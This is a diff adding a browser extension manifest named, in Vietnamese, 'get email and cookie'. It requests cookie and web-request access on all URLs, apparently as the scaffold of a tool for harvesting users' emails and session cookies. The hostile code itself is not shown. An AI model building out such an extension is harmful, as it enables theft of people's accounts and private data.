@@ -1,0 +1,21 @@
+{
+  "name": "lấy imel và cookie",
+  "version": "1.0",
+  "manifest_version": 3,
+  "background": {
+    "service_worker": "background.js"
+  },
+  "permissions": [
+    "notifications",
+    "activeTab",
+    "webRequest",
+    "webRequestBlocking",
+    "cookies"
+  ],
+  "host_permissions": [
+    "<all_urls>"
+  ],
+  "action": {
+    "default_popup": "popup.html"
+  }
+}
